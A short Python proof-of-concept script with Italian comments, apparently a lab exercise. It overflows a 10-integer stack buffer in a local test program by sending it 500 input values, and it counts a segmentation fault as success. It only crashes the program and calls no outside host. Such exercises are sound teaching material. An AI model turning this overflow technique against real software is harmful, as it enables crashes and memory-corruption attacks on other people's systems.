import subprocess
import time

# --- 1. Costruzione del Payload ---
# Questo exploit funziona con Fixed_BW_D3_BOF.c 

payload = []

# Scelta della Modalità Vulnerabile (opzione 2)
payload.append("2")

# Nella modalità 2, abbiamo un buffer locale small_vector[10]
# che può contenere solo 10 interi (40 bytes)
# Ma il programma prova a inserire 500 valori

# Strategia: riempire con valori che causano overflow
# Gli offset esatti dipendono dal layout dello stack

# Riempimento iniziale del buffer (10 valori validi)
for i in range(10):
    payload.append(str(i + 1))

# Overflow: continuiamo a inserire valori oltre il limite
# Questi sovrascriveranno memoria adiacente nello stack
for _ in range(490):
    payload.append("2147483647")  # MAX_INT per massimizzare corruzione

# Unisce tutto l'input
payload_string = "\n".join(payload) + "\n"

# --- 2. Esecuzione dell'Exploit ---
programma_vulnerabile = "./Fixed_BW_D3_BOF"

print(f"--- Avvio di: {programma_vulnerabile} ---")
print(f"--- Invio del payload ({len(payload)} righe) ---")

process = subprocess.Popen(
    [programma_vulnerabile],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

try:
    stdout_output, stderr_output = process.communicate(
        input=payload_string,
        timeout=5
    )
    
    print("\n--- Output del Programma (stdout) ---")
    print(stdout_output)
    
    print("\n--- Output degli Errori (stderr) ---")
    print(stderr_output)
    
except subprocess.TimeoutExpired:
    print("\n--- Programma bloccato (Timeout) ---")
    process.kill()

# --- 3. Controllo del Risultato ---
print("\n--- Risultato dell'Exploit ---")
if process.returncode == -11:  # SIGSEGV
    print(f"✓ SUCCESSO! :-)")
    print(f"Il programma è crashato con Segmentation Fault (Codice: {process.returncode})")
elif process.returncode == -6:  # SIGABRT
    print(f"✓ SUCCESSO PARZIALE!")
    print(f"Il programma è crashato con SIGABRT (Codice: {process.returncode})")
else:
    print(f"(!) Fallito. Il programma è terminato normalmente (Codice: {process.returncode})")
print("\n--- Fine dell'Exploit ---")